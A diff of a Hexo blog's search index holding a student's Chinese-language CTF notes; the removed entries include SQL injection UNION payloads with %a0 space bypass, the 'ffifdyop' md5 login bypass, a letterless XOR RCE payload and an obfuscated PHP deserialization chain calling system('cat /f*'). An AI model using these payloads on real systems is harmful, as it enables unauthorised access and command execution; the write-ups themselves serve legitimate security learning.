@@ -1,216 +1,56 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CS入门黑话收集</title>
-    <url>/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[<p>此为个人理解，争取往大白话，口语化方向看齐。</p>
-<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h1 id="CMD指纹"><a href="#CMD指纹" class="headerlink" title="CMD指纹"></a>CMD指纹</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><p>没有被公开发表的漏洞。也就是说你做这道题不可以查已经发表的CVE来复现得到flag。</p>
-<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
+    <title>博客建设记录</title>
+    <url>/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>主题：next gemini</p>
+<p>25&#x2F;3&#x2F;1</p>
+<p>换主题</p>
+<p>auto_excerpt:			#自动摘录（不推荐）  </p>
+<p>enable: false  </p>
+<p>length: 150</p>
+<p>(这个没有用)</p>
+<p>只能用<span id="more"></span></p>
+<p>*评论系统：valine（能看得到评论界面无法评论）</p>
+<p>*加密：测试后发现输入密码后有回显但是无法看到文章</p>
+<!--more-->
 
-<p>长这样：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看板娘；神秘出现,</p>
+<p>我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？</p>
+<p>25&#x2F;2&#x2F;24</p>
+<p>因为 遮挡了右边目录删掉了看板娘，画风不符</p>
+<p>25&#x2F;2&#x2F;27</p>
+<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/E8FE32616C6A10880D0E42AB9041634E.png" class="" title="E8FE32616C6A10880D0E42AB9041634E">
 
-<h3 id="结"><a href="#结" class="headerlink" title="结"></a>结</h3><table>
-<thead>
-<tr>
-<th align="left">部分</th>
-<th align="left">是否可解码？</th>
-<th align="left">作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Header</td>
-<td align="left">✅ 可解码</td>
-<td align="left">声明算法和类型</td>
-</tr>
-<tr>
-<td align="left">Payload</td>
-<td align="left">✅ 可解码</td>
-<td align="left">携带实际数据（如用户信息）</td>
-</tr>
-<tr>
-<td align="left">Signature</td>
-<td align="left">❌ 不可解码</td>
-<td align="left">验证 Token 的合法性</td>
-</tr>
-</tbody></table>
-<p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[NCTF 2018]滴!晨跑打卡</title>
-    <url>/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/</url>
-    <content><![CDATA[<p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
-<p>FUZZ看屏蔽什么</p>
-<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+<img src="/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/EF5FCA7498781CC07C04C295087FAA47.png" class="" title="EF5FCA7498781CC07C04C295087FAA47">
 
-<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
-<blockquote>
-<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
-</blockquote>
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>Index</category>
       </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>报错注入</tag>
-        <tag>空格绕过</tag>
-      </tags>
   </entry>
   <entry>
-    <title>[BJDCTF 2020]easy_md5</title>
-    <url>/2025/02/13/BJDCTF-2020-easy-md5-1/</url>
-    <content><![CDATA[<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>dir扫扫没头绪别管了看下wp</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-133501.png" class="" title="QQ20250213-133501">
+    <title>SSTI集中学习题目汇总</title>
+    <url>/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>[FSCTF 2023]base套</title>
+    <url>/2025/02/28/%C2%96FSCTF-2023-base%E5%A5%97/</url>
+    <content><![CDATA[<p>这个题目是给了一个很多次base64编码，每一次还会加上中文前缀的结果，要求解码</p>
+<p>主要任务是写一个脚本</p>
+<p>下面是我写的极简脚本~~~</p>
+<span id="more"></span>
 
-<p>原来我们的小提示在输入框的返回响应头里</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
-
-<p>从名为 <code>&#39;admin&#39;</code> 的表中，选择所有列（<code>*</code>），但条件是密码字段的值必须等于一个通过 <code>md5</code> 函数加密后生成的密码。</p>
-<p>然后呢？密码呢？注入看看，好像不会，看看wp</p>
-<p><a href="https://www.nssctf.cn/note/set/3001">https://www.nssctf.cn/note/set/3001</a></p>
-<p>当‘ or ’ 后面的值为True是，就能构成万能密码，实现绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;true&#x27;</span><br></pre></td></tr></table></figure>
-
-<h4 id="补充知识点："><a href="#补充知识点：" class="headerlink" title="补充知识点："></a>补充知识点：</h4><p><strong>MySQL的一个特性：</strong></p>
-<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p>
-<p>要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。</p>
-<p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1abcdefg&#x27;    ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0abcdefg&#x27;    ---&gt;  False</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;2&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0&#x27;           ---&gt;  False</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">for ($i = 0;;) &#123; </span><br><span class="line"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class="line">  if (stripos(md5($i, true), &#x27;\&#x27;or\&#x27;&#x27;) !== false)</span><br><span class="line">   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;</span><br><span class="line"> echo &quot;.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span><br></pre></td></tr></table></figure>
-
-<h1 id="其实我看不懂下面一段"><a href="#其实我看不懂下面一段" class="headerlink" title="*其实我看不懂下面一段"></a>*其实我看不懂下面一段</h1><p>这里提供一个最常用的：<strong>ffifdyop</strong>，该字符串md5加密后若md5()的参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)</p>
-<p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;           ---&gt;  True</span><br></pre></td></tr></table></figure>
-
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135621.png" class="" title="QQ20250213-135621">
-
-<p>这个过滤我会过过过</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135937.png" class="" title="QQ20250213-135937">
-
-<h3 id="方法-1：利用已知的-MD5-碰撞"><a href="#方法-1：利用已知的-MD5-碰撞" class="headerlink" title="方法 1：利用已知的 MD5 碰撞"></a>方法 1：利用已知的 MD5 碰撞</h3><h3 id="方法-2：利用-PHP-的类型特性（如果条件允许）"><a href="#方法-2：利用-PHP-的类型特性（如果条件允许）" class="headerlink" title="方法 2：利用 PHP 的类型特性（如果条件允许）"></a>方法 2：利用 PHP 的类型特性（如果条件允许）</h3><p>数组绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
-
-<p>在这种情况下：</p>
-<ul>
-<li><code>param1</code> 和 <code>param2</code> 都是数组，它们的值不同（<code>[1] !== [2]</code>）。</li>
-<li><code>md5(param1)</code> 和 <code>md5(param2)</code> 都返回 <code>null</code>，因此 <code>null === null</code> 为 <code>true</code>。</li>
-</ul>
-<p>BP一直抓的是上一次的包所以没成功太尴尬了</p>
-<h1 id="知识点总结：PHPmd5绕过"><a href="#知识点总结：PHPmd5绕过" class="headerlink" title="知识点总结：PHPmd5绕过"></a>知识点总结：PHPmd5绕过</h1><h2 id="两个等号-0e绕过（记录特殊值"><a href="#两个等号-0e绕过（记录特殊值" class="headerlink" title="两个等号 0e绕过（记录特殊值"></a>两个等号 0e绕过（记录特殊值</h2><h2 id="三个等号-数组绕过"><a href="#三个等号-数组绕过" class="headerlink" title="三个等号 数组绕过"></a>三个等号 数组绕过</h2><p>tags:</p>
-<ul>
-<li>md5</li>
-<li>弱比较</li>
-<li>强比较</li>
-<li>数组绕过</li>
-<li>PHP</li>
-</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">b64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b64 = re.sub(<span class="string">r&#x27;flag|[一-龥]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, b64) <span class="comment"># 语法不熟</span></span><br><span class="line">        decoded_b64 = b64decode(b64)</span><br><span class="line">        <span class="keyword">return</span> decoded_b64.decode(),<span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> b64,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file: <span class="comment"># 现在会啦</span></span><br><span class="line">     flag = file.read()</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">         flag,can_decode = base64_decode(flag)</span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> can_decode:</span><br><span class="line">             <span class="built_in">print</span>(flag)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>Misc</category>
       </categories>
       <tags>
-        <tag>md5</tag>
-        <tag>弱比较</tag>
-        <tag>强比较</tag>
-        <tag>数组绕过</tag>
-        <tag>PHP</tag>
+        <tag>字符编码</tag>
+        <tag>编码分析</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>[HUBUCTF 2022 新生赛]HowToGetShell</title>
-    <url>/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/</url>
-    <content><![CDATA[<p>其实本来是想取反绕过的，但是没反应也没有触发过滤，就很奇怪，理论上能在本地跑个源代码，但是为啥跑出来是源代码呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mess=&#x27;(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);&#x27;;</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure>
-
-<p>deepseek稍后再试，豆包法律风险，GPT开着代理还说两句就不理人，kimi销声匿迹，文心一言不语知识一昧的说有法律风险，你们五个真的是 让我选不出来一个</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>    <span class="comment">#可以过的字母</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp1,tmp2)</span><br></pre></td></tr></table></figure>
-
-<p>偷个脚本</p>
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0302181    @[@[_^^</span><br></pre></td></tr></table></figure>
-
-
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure>
-
-
-
-<p>明天要在平板上远程控制问的问题：</p>
-<h1 id="是什么？"><a href="#是什么？" class="headerlink" title="$_ ;$_(); 是什么？"></a>$_ ;$_(); 是什么？</h1>]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>取反绕过</tag>
-        <tag>异或绕过</tag>
-        <tag>无字母RCE</tag>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[DownUnderCTF 2022]no_symlink</title>
-    <url>/2025/02/22/DownUnderCTF-2022-no-symlink/</url>
-    <content><![CDATA[<p>看不懂，跪了</p>
-<p><a href="https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web">https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web</a></p>
-<p><a href="http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink">http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink</a></p>
-<p><a href="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick">https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick</a></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>不懂</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP反序列化学习笔记汇总</title>
-    <url>/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct()</span><br></pre></td></tr></table></figure>
-
-<p>触发时机：</p>
-<p>1、实例化对象结束后触发  如$test&#x3D;new User();</p>
-<p>2、在反序列化之后立马会触发（序列化不会触发）</p>
-<p>就是</p>
-<p>$a &#x3D;<strong>new</strong> b</p>
-<p><strong>unserialize()</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__toString()</span><br></pre></td></tr></table></figure>
-
-<p>把对象当成字符串使用</p>
-<p>就是</p>
-<p><strong>echo</strong></p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CS自学指南笔记</title>
-    <url>/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<p><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a></p>
-<p><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NPC²CTF_部分WP</title>
-    <url>/2025/02/17/NPC%C2%B2CTF-%E9%83%A8%E5%88%86WP/</url>
-    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phone</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">please</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wake</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">up</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">me</span></span>&#123;<span class="keyword">public</span> <span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$d</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phone</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phone</span>();</span><br><span class="line"><span class="variable">$phone</span>-&gt;a = <span class="variable">$rce</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$wake</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wake</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">up</span>();</span><br><span class="line"><span class="variable">$dummy</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;a = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;b = &amp;<span class="variable">$dummy</span>;</span><br><span class="line"><span class="variable">$up</span>-&gt;c = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> <span class="title function_ invoke__">me</span>();</span><br><span class="line"><span class="variable">$me</span>-&gt;a = <span class="variable">$wake</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;b = <span class="variable">$up</span>;</span><br><span class="line"><span class="variable">$me</span>-&gt;c = [<span class="number">2</span> =&gt; [<span class="variable">$phone</span>, <span class="string">&#x27;test&#x27;</span>]];</span><br><span class="line"><span class="variable">$me</span>-&gt;d = <span class="string">&#x27;wakeup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$please</span> = <span class="keyword">new</span> <span class="title function_ invoke__">please</span>();</span><br><span class="line"><span class="variable">$please</span>-&gt;a = <span class="variable">$me</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$please</span>));<span class="comment">#这里要记得url编码QAQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#$rce中是用于rce的代码，用自增、取反、异或构造出形如system()即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#汉字取反(感谢选手lzz0403 QAQ</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27; $_++;</span></span><br><span class="line"><span class="string">$__ = &quot;牥&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;獡&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;砏&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;盔&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;犤&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;璜&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);$__ = &quot;珟&quot;;</span></span><br><span class="line"><span class="string">$___ .= ~($__&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$____ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;疘&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);$____ = &quot;皕&quot;;</span></span><br><span class="line"><span class="string">$_____ .= ~($____&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$______ = &quot;癖&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瓛&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瞑&quot;;</span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);$______ = &quot;瘗&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_______ .= ~($______&#123;$_&#125;);</span></span><br><span class="line"><span class="string">$___($_____(&quot;/&quot;.$_______));</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#这是自增，记得去掉注释</span></span><br><span class="line"><span class="variable">$rce</span>=<span class="string">&#x27;$_=[];</span></span><br><span class="line"><span class="string">$_=@&quot;$_&quot;;</span></span><br><span class="line"><span class="string">$__=$_[&quot;[&quot;==&quot;]&quot;];</span></span><br><span class="line"><span class="string">$___=$_[&quot;[&quot;==&quot;[&quot;];</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;</span></span><br><span class="line"><span class="string">$____=$__^$___;</span></span><br><span class="line"><span class="string">$____--;</span></span><br><span class="line"><span class="string">$___=$_[$____];</span></span><br><span class="line"><span class="string">$____++;</span></span><br><span class="line"><span class="string">$_____=$___;#a</span></span><br><span class="line"><span class="string">$___++;$___++;#c</span></span><br><span class="line"><span class="string">$_____=$___.$_____;#ca</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;#f</span></span><br><span class="line"><span class="string">$______=&quot; /&quot;.$___.&quot;*&quot;;# /f*</span></span><br><span class="line"><span class="string">$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;#t</span></span><br><span class="line"><span class="string">$_____=$_____.$___;#cat</span></span><br><span class="line"><span class="string">$_____=$_____.$______;#cat /f*</span></span><br><span class="line"><span class="string">$__++;$__++;#C</span></span><br><span class="line"><span class="string">$__++;$__++;#E</span></span><br><span class="line"><span class="string">$________=$__;#E</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;#H</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;#M</span></span><br><span class="line"><span class="string">$________=$________.$__;#EM</span></span><br><span class="line"><span class="string">$__++;$__++;#O</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$_________=$__;#S</span></span><br><span class="line"><span class="string">$__++;</span></span><br><span class="line"><span class="string">$________=$__.$________;#TEM</span></span><br><span class="line"><span class="string">$________=$_________.$________;#STEM</span></span><br><span class="line"><span class="string">$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="string">$________=$_________.$__.$________;#SYSTEM</span></span><br><span class="line"><span class="string">$________($_____);</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
   </entry>
   <entry>
     <title>SSTI学习总结</title>
@@ -331,66 +171,89 @@
       </tags>
   </entry>
   <entry>
-    <title>SSTI集中学习题目汇总</title>
-    <url>/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/</url>
-    <content><![CDATA[]]></content>
+    <title>[NISACTF 2022]midlevel</title>
+    <url>/2025/02/26/%C2%96NISACTF-2022-midlevel/</url>
+    <content><![CDATA[<img src="/2025/02/26/%C2%96NISACTF-2022-midlevel/QQ20250226-213100.png" class="" title="QQ20250226-213100">
+
+<h1 id="大概流程："><a href="#大概流程：" class="headerlink" title="大概流程："></a>大概流程：</h1><p>发现是smarty，在xff注入，查看文件，执行命令</p>
+<h1 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h1>]]></content>
   </entry>
   <entry>
-    <title>[HNCTF 2022 WEEK4]pop子和pipi美</title>
-    <url>/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/</url>
-    <content><![CDATA[<img src="/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/QQ20250215-200622.png" class="" title="QQ20250215-200622">
-
-<img src="/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/QQ20250215-200707.png" class="" title="QQ20250215-200707">
-
-<p>我会老实交代我是看wp知道传入参数的</p>
